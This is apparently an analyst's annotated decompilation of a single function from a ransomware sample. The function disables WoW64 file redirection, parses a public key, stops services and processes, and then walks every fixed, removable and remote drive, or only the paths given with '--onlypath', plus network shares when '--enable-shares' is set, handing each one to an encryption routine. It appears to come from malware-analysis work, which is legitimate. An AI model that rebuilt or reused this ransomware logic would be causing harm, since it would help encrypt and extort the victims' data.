int __stdcall ProcessPipeline(LPVOID lpParameter)
{
  HANDLE Thread; // eax
  const WCHAR *CommandLineW; // eax
  __int16 *v4; // [esp+24h] [ebp-74h]
  int pNumArgs; // [esp+28h] [ebp-70h] BYREF
  PVOID OldValue; // [esp+2Ch] [ebp-6Ch] BYREF
  PCWSTR pszFirst; // [esp+30h] [ebp-68h]
  int DriveTypeW; // [esp+34h] [ebp-64h]
  SIZE_T v9; // [esp+38h] [ebp-60h]
  DWORD FileAttributesW; // [esp+3Ch] [ebp-5Ch]
  SIZE_T uBytes; // [esp+40h] [ebp-58h]
  char *ptrObj; // [esp+44h] [ebp-54h]
  char *v13; // [esp+48h] [ebp-50h]
  __int16 *v14; // [esp+4Ch] [ebp-4Ch]
  int v15; // [esp+50h] [ebp-48h]
  WCHAR v18; // [esp+5Ah] [ebp-3Eh]
  int v21; // [esp+60h] [ebp-38h]
  HLOCAL hMem; // [esp+64h] [ebp-34h]
  WCHAR *v23; // [esp+68h] [ebp-30h]
  WCHAR *v24; // [esp+6Ch] [ebp-2Ch]
  LPCWSTR v25; // [esp+70h] [ebp-28h]
  LPWSTR lpBuffer; // [esp+74h] [ebp-24h]
  DWORD driveStringBuff; // [esp+78h] [ebp-20h]
  LPCWSTR v28; // [esp+7Ch] [ebp-1Ch]
  int i; // [esp+80h] [ebp-18h]
  __int16 *v30; // [esp+84h] [ebp-14h]
  LPCWSTR v31; // [esp+88h] [ebp-10h]
  __int16 v32; // [esp+8Eh] [ebp-Ah]
  LPCWSTR lpFileName; // [esp+90h] [ebp-8h]
  LPCWSTR lpRootPathName; // [esp+94h] [ebp-4h]

  driveStringBuff = 0;
  lpBuffer = 0;
  OldValue = 0;
  DriveTypeW = 0;
  // Get a pointer to the command line arguments string
  pszFirst = GetCommandLineW();
  v13 = (char *)ImpLocalAlloc(0x28u);
  if ( v13 )
    ptrObj = PtrRefObj(v13);
  else
    ptrObj = 0;
  ptrPtrObj = (int)ptrObj;
  // Disable the WoW64 file system redirection setting.  The old value is never reset
  Wow64DisableWow64FsRedirection(&OldValue);
  sub_436EF0();
  sub_436C60();
  PrepPublicKey();                              // Parse public key in a new thread
  PrepareDirectoryPaths();                      // Prepares important directories
  PrepareExcludeFiles();                        // Prepare exclude file name list
  PrepareFileExtensions();                      // Prepare file extensions for filtering
  if ( !AquireNewCryptoAPIHandle() )
  {
    // Update the console title every half second with the processing counter
    CreateThread(0, 0, (LPTHREAD_START_ROUTINE)UpdateConsoleTitleInterval, lpParameter, 0, 0);
    // Stop services and processes in a new thread
    Thread = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)StopServicesAndProcs, 0, 0, 0);
    CloseHandle(Thread);
    // Process A specific path
    if ( StrStrIW(pszFirst, L"--onlypath") )
    {
      CommandLineW = GetCommandLineW();
      hMem = CommandLineToArgvW(CommandLineW, &pNumArgs);
      if ( !hMem )
        return 0;
      for ( i = 1; i < pNumArgs; ++i )
      {
        v30 = (__int16 *)*((_DWORD *)hMem + i);
        v4 = v30 + 1;
        while ( *v30++ )
          ;
        v15 = v30 - v4 + 4;
        if ( (unsigned int)(v30 - v4) < 0xFFFFFFFC && v15 != 4 )
        {
          if ( ((2 * v15 + 16) & 0xFFFFFFF0) >= 0x10 )
            uBytes = (2 * v15 + 16) & 0xFFFFFFF0;
          else
            uBytes = 16;
          lpFileName = (LPCWSTR)LocalAlloc(0x40u, uBytes);
          v14 = (__int16 *)*((_DWORD *)hMem + i);
          v24 = (WCHAR *)lpFileName;
          do
          {
            v32 = *v14;
            *v24 = v32;
            ++v14;
            ++v24;
          }
          while ( v32 );
          v28 = lpFileName;
          while ( *v28++ )
            ;
          if ( lpFileName[v28 - (lpFileName + 1) - 1] != 92 )
          {
            v23 = (WCHAR *)(lpFileName - 1);
            do
            {
              v18 = v23[1];
              ++v23;
            }
            while ( v18 );
            *(_DWORD *)v23 = 92;
          }
          FileAttributesW = GetFileAttributesW(lpFileName);
          // is a FILE_ATTRIBUTE_DIRECTORY
          if ( FileAttributesW != -1 && (FileAttributesW & 0x10) != 0 )
            HandlePath(lpFileName);             // Process the specific path for encryption
        }
      }
      LocalFree(hMem);
    }
    else
    {
      // Enumerate file paths and logical drive letters
      driveStringBuff = GetLogicalDriveStringsW(0, lpBuffer);
      if ( driveStringBuff )
      {
        v9 = ((2 * driveStringBuff + 16) & 0xFFFFFFF0) >= 0x10 ? (2 * driveStringBuff + 16) & 0xFFFFFFF0 : 16;
        lpBuffer = (LPWSTR)LocalAlloc(0x40u, v9);
        if ( lpBuffer )
        {
          GetLogicalDriveStringsW(driveStringBuff, lpBuffer);
          for ( lpRootPathName = lpBuffer; ; lpRootPathName += v31 - (lpRootPathName + 1) + 1 )
          {
            v25 = lpRootPathName;
            while ( *v25++ )
              ;
            if ( !(v25 - (lpRootPathName + 1)) )
              break;
            DriveTypeW = GetDriveTypeW(lpRootPathName);
            // Is the drive a DRIVE_REMOVABLE, DRIVE_FIXED or DRIVE_REMOTE
            if ( FilterDriveType(DriveTypeW) )
            {
              HandlePath(lpRootPathName);
              LogToSTDOUT("HARD DISK : %ws\n", (char)lpRootPathName);
            }
            v31 = lpRootPathName;
            while ( *v31++ )
              ;
          }
        }
      }
      // Enumerate and process file shares
      if ( StrStrIW(pszFirst, L"--enable-shares") )
      {
        EnumerateShareLocations(0);
        v21 = 1;
        if ( dword_44A380[1] )
          HandlePath(dword_44A380[v21]);
      }
    }
    FreeMem();
  }
  return 0;
}